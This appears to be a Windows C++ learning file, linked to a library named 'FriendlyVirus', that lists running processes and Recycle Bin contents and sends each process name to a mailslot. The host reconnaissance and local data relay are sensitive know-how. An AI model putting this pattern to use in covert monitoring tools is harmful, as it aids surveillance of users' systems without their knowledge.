#include "pch.h"
#include <iostream>
#include<Windows.h>
#include <TlHelp32.h>
#include<Psapi.h>
#include <ShlObj.h>
#include<exception>
#include<PathCch.h>
#include"../FriendlyVirus/FriendlyVirus.h"

#pragma comment(lib,"shell32.lib")
#pragma comment(lib,"../debug/FriendlyVirus.lib")

//获取主机中所有正在运行的进程信息
WCHAR** GetAllRunningProcess() {
	HANDLE hSnapshot;
	WCHAR** pe=NULL;
	WCHAR ** petmp = NULL;
	WCHAR *exeName = NULL;
	PROCESSENTRY32 peCur;
	DWORD dwProcessIds[1024];
	DWORD dwBytesOfAllProcess = 0;
	EnumProcesses(dwProcessIds, sizeof(dwProcessIds), &dwBytesOfAllProcess);
	pe = (WCHAR**)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (dwBytesOfAllProcess/sizeof(DWORD)+1)*sizeof(WCHAR*));
	petmp = pe;
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	peCur.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hSnapshot, &peCur)) {
		printf("Process32First() failed!errpr:%d\n", GetLastError());
		return nullptr;
	}
	do {
		exeName = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(peCur.szExeFile));
		CopyMemory(exeName, peCur.szExeFile, (lstrlen(peCur.szExeFile)+1)*sizeof(WCHAR));
		*petmp = exeName;
		petmp++;
	} while (Process32Next(hSnapshot, &peCur));
	return pe;
};

//获取回收站的内容
VOID GetDustBinFolderInformation() {
	LPITEMIDLIST lptmdl;
	LPENUMIDLIST lpenum;
	LPITEMIDLIST lptmdlCurrent;
	IShellFolder *lsfdBase=NULL;
	IShellFolder *lsfdObj=NULL;
	DWORD dwFetched = 0;
	SHGetDesktopFolder(&lsfdBase);
	SHGetFolderLocation(nullptr, CSIDL_BITBUCKET, nullptr, 0,&lptmdl);
	lsfdBase->BindToObject(lptmdl, NULL, IID_IShellFolder, (void**)&lsfdObj);
	lsfdObj->EnumObjects(NULL, SHCONTF_NONFOLDERS | SHCONTF_FOLDERS | SHCONTF_INCLUDEHIDDEN,&lpenum);
	STRRET strret;
	ZeroMemory(&strret, sizeof(STRRET));
	while (true){
		if (lpenum->Next(1, &lptmdlCurrent, &dwFetched) == S_FALSE) {
			printf("目标文件夹内为空！\n");
			break;
		}
		lsfdObj->GetDisplayNameOf(lptmdlCurrent, SHGDN_NORMAL, &strret);
		printf("%ws\t%s\n", strret.pOleStr,strret.cStr);
	}
}

int main()
{
	/*LPITEMIDLIST lpitlst;
	LPITEMIDLIST lpitlstCurrent;
	IShellFolder *isllfd;
	LPENUMIDLIST lpEnum;
	DWORD dwFetched;
	SHGetFolderLocation(NULL, CSIDL_DESKTOP,NULL,0,&lpitlst);
	SHGetDesktopFolder(&isllfd);
	STRRET strret;
	ZeroMemory(&strret, sizeof(strret));
	isllfd->EnumObjects(nullptr, SHCONTF_NONFOLDERS | SHCONTF_FOLDERS | SHCONTF_INCLUDEHIDDEN,&lpEnum);
	while (true)
	{
		if (lpEnum->Next(1, &lpitlstCurrent, &dwFetched) == S_FALSE) {
			printf("目标文件夹没有内容了");
			break;
		}
		isllfd->GetDisplayNameOf(lpitlstCurrent, SHGDN_NORMAL, &strret);
		printf("%ws\n", strret.pOleStr);
	}*/
	WCHAR **content = NULL;
	WCHAR **content_ = NULL;
	content = GetAllRunningProcess();
	content_ = content;
	while (*content) {
		//printf("%ws\n", *content);
		SendMessageToMailslot(*content, (lstrlen(*content)+1) * sizeof(WCHAR));
		content++;
	}
	FreePointers(&content_);
	return 0;
}